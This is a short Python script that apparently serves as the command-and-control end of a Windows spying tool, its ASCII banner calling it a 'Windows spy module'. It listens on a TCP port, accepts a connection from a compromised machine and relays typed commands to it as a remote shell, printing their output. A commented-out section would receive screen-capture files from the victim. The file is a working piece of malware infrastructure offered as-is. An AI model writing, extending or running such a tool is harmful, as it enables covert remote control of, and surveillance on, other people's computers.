import socket, os, threading, random
from termcolor import colored
from random import randint

IP = "192.168.0.3"
PORT = 6667
BUFFER = 1024

os.system("cls")

choice_LOGO = randint(1, 4)

logo1 = """
    Art by: Hayley Jane Wakenshaw
           _e-e_
         _(-._.-)_
      .-(  `---'  )-. hjw
     __\ \\\___/// /__
    '-._.'/M\ /M\`._,-
"""

logo2 = """
    art by: Joan Stark
          _          _          _          _          _
        >(')____,  >(')____,  >(')____,  >(')____,  >(') ___,
          (` =~~/    (` =~~/    (` =~~/    (` =~~/    (` =~~/
    jgs~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~^`---'~^~^~
"""

logo3 = """
    art by: Argiris A. Kranidiotis
     ____________________________
    /                           /\
   /    Windows spy module    _/ /\
  /                          / \/
 /                           /\
/___________________________/ /
\___________________________\/
 \ \ \ \ \ \ \ \ \ \ \ \ \ \ \
"""

logo4 = """
    Art by Joan G. Stark
    ___
    \_/
     |._
     |'."-._.-""--.-"-.__.-'/
     |  \       .-.        (
     |   |     (@.@)        )
     |   |   '=.|m|.='     /
jgs  |  /    .='`"``=.    /
     |.'                 (
     |.-"-.__.-""-.__.-"-.)
     |
     |
     |
"""

if(choice_LOGO == 1):
    print(logo1)
if(choice_LOGO == 2):
    print(logo2)
if(choice_LOGO == 3):
    print(logo3)
if(choice_LOGO == 4):
    print(logo4)



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
server.bind((IP, PORT))
print(colored("server runing on ip:{0} and port:{1}".format(IP,PORT), "green"))
print(colored("\n to send server commands type: /[command]}","red"))
server.listen(10)
conn, addr = server.accept()
print(colored("conn recived from:{0}".format(addr), "green"))
if conn:
    while True:
        cmd = input("SHELL> ")
        if cmd == "/exit":
            conn.send("exit".encode("utf-8"))
            break
        if cmd == "/stay":
            print(colored("[/] await the pc start!", "yellow"))
        #if cmd == "/screenlog":
        #    print("[-] awaiting data ...")
        #    filename = conn.recv(BUFFER).decode("utf-8")
        #    with open(filename, "wb") as f:
        #        data = conn.recv(BUFFER)
        #        if not data:
        #            break
        #        f.write(data)
            
        conn.send((cmd).encode('utf-8'))
        output = conn.recv(BUFFER).decode('utf-8')
        print(output)
server.close()
exit()
        
        

    